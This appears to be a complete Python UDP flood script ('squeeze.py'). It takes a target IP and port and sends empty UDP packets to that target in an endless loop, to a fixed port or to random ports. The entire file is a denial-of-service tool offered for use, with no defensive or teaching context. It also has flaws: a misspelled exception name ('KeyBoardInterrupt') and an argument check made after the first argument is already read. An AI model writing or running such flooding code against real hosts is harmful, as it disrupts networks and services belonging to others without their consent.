from socket import *
import sys
import random

if sys.argv[1] == "-h":
	print("Syntax: squeeze.py ip port randomise?\n Where ip = target ip, port = target port and randomise? = 't' for randomise target port and 'f' for supplied port")
	sys.exit()

if len(sys.argv) != 4:
	print("Incorrect usage: use squeeze.py -h for help")
	sys.exit()

ip = str(sys.argv[1])
port = int(sys.argv[2])
ran = sys.argv[3]

message = ""

def flood():
	print("Flooding " + ip + ", on port " + str(port) + "... Ctrl+C to stop")
	clientSocket = socket(AF_INET, SOCK_DGRAM)

	while True:
		clientSocket.sendto(message.encode(), (ip, port))

def ran_flood():
	print("Flooding " + ip + ", randomising ports... Ctrl+C to stop")
	clientSocket = socket(AF_INET, SOCK_DGRAM)

	while True:
		port = random.randint(1, 65535)
		print(port)
		clientSocket.sendto(message.encode(), (ip, port))


if ran == "f":

	try:
		flood()
	except KeyBoardInterrupt:
		sys.exit()

elif ran == "t":

	try:
		ran_flood()
	except KeyBoardInterrupt:
		sys.exit()
else:
	print("Incorrect argument: use squeeze.py -h for help")
